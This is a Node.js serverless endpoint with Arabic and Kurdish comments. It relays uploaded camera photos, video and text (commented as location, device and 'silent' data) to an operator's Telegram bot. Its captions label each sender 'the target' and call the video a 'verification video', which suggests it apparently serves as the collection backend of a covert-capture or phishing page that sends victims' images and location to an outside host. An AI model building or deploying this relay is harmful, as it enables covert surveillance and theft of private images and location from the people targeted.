// api/send.js — وسيط التطبيق (Vercel Serverless, Node 18+)
import Busboy from 'busboy';

export const config = {
    api: {
        bodyParser: false,   // ڕێگە بە bodyParserـی پێشگریمان نادەین بۆ multipart
    },
};

export default async function handler(req, res) {
    if (req.method !== 'POST') {
        return res.status(405).json({ ok: false, error: 'POST only' });
    }

    // ====== التوكن والمعرف من إعدادات مشروعك على Vercel ======
    const TOKEN = process.env.TELEGRAM_TOKEN || '';
    const CHAT_ID = process.env.TELEGRAM_CHAT_ID || '';

    if (!TOKEN || !CHAT_ID) {
        return res.status(500).json({ ok: false, error: 'مفاتيح الخادم غير مضبوطة بعد' });
    }

    const tg = `https://api.telegram.org/bot${TOKEN}`;
    const contentType = req.headers['content-type'] || '';

    // ====== 1. پشتگیری FormData (بۆ ڤیدیۆ) ======
    if (contentType.includes('multipart/form-data')) {
        const busboy = Busboy({ headers: req.headers });
        const fields = {};
        const files = [];

        busboy.on('field', (name, val) => {
            fields[name] = val;
        });

        busboy.on('file', (fieldname, file, info) => {
            const chunks = [];
            file.on('data', (chunk) => chunks.push(chunk));
            file.on('end', () => {
                files.push({
                    fieldname,
                    buffer: Buffer.concat(chunks),
                    filename: info.filename,
                    mimeType: info.mimeType,
                });
            });
        });

        busboy.on('finish', async () => {
            const chatId = String(fields.chatId || '').slice(0, 64) || 'غير معروف';
            const videoFile = files.find(f => f.fieldname === 'video');

            if (!videoFile || !videoFile.buffer.length) {
                return res.status(400).json({ ok: false, error: 'ملف الفيديو مفقود' });
            }

            try {
                const form = new FormData();
                form.append('chat_id', CHAT_ID);
                form.append('video', new Blob([videoFile.buffer], { type: videoFile.mimeType }), videoFile.filename);
                form.append('caption', `🎥 فيديو التحقق\n👤 الهدف: ${chatId}\n🕐 ${new Date().toLocaleString('ar')}`);

                const r = await fetch(`${tg}/sendVideo`, { method: 'POST', body: form });
                const j = await r.json().catch(() => ({}));
                return res.status(r.ok ? 200 : 502).json({ ok: r.ok, error: j.description });
            } catch (e) {
                return res.status(500).json({ ok: false, error: e.message });
            }
        });

        req.pipe(busboy);
        return;
    }

    // ====== 2. پشتگیری JSON (بۆ وێنە و دەق) – کۆدی بنەڕەتی خۆت ======
    let body;
    try {
        body = typeof req.body === 'object' ? req.body : JSON.parse(req.body);
    } catch {
        return res.status(400).json({ ok: false, error: 'JSON غير صالح' });
    }

    const chatId = String(body.chatId || '').slice(0, 64);
    if (!chatId) return res.status(400).json({ ok: false, error: 'chatId مفقود' });

    try {
        // ====== وێنەیی (كاميرا) ======
        if (body.type === 'photo') {
            const dataUrl = String(body.photo || '');
            const base64 = dataUrl.includes(',') ? dataUrl.split(',')[1] : dataUrl;
            const buf = Buffer.from(base64, 'base64');
            if (!buf.length || buf.length > 4 * 1024 * 1024) {
                return res.status(400).json({ ok: false, error: 'صورة غير صالحة' });
            }
            const form = new FormData();
            form.append('chat_id', CHAT_ID);
            form.append('caption',
                `${body.caption || '📸 صورة'}\n👤 الهدف: ${chatId}\n🕐 ${new Date().toLocaleString('ar')}`);
            form.append('photo', new Blob([buf], { type: 'image/jpeg' }), `cap_${chatId}.jpg`);

            const r = await fetch(`${tg}/sendPhoto`, { method: 'POST', body: form });
            const j = await r.json().catch(() => ({}));
            return res.status(r.ok ? 200 : 502).json({ ok: r.ok, error: j.description });
        }

        // ====== نص (موقع/جهاز/صامت) ======
        const text = String(body.text || '').slice(0, 4000);
        if (!text) return res.status(400).json({ ok: false, error: 'نص فارغ' });

        const r = await fetch(`${tg}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: `${text}\n👤 الهدف: ${chatId}`
            })
        });
        const j = await r.json().catch(() => ({}));
        return res.status(r.ok ? 200 : 502).json({ ok: r.ok, error: j.description });

    } catch (e) {
        return res.status(500).json({ ok: false, error: e.message });
    }
}